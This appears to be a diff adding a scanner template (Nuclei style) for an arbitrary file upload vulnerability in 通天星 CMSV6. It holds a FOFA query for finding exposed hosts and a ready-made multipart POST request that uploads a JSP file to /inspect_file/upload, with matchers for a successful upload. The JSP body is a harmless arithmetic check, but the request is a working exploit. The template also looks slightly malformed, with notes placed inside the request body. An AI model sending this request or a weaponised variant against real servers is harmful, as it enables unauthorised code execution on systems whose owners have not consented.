@@ -1,0 +1,59 @@
+id: poc-wa3goo3m2gi8hc62
+info:
+  name: 通天星-CMSV6-inspect_file-upload 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wa3goo3m2gi8hc62'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wa3goo3m2gi8hc62
+    fofa: body="808gps"
+http:
+- raw:
+  - 'POST /inspect_file/upload HTTP/1.1
+
+
+    Accept: */*
+
+
+    Content-Type: multipart/form-data;boundary=-----------------------------7db372eb000e2
+
+
+
+
+    -----------------------------7db372eb000e2
+
+
+    Content-Disposition: form-data; name="uploadFile"; filename="dudesite.jsp"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    <% out.println(11*11);%>
+
+
+    -----------------------------7db372eb000e2--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    121
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
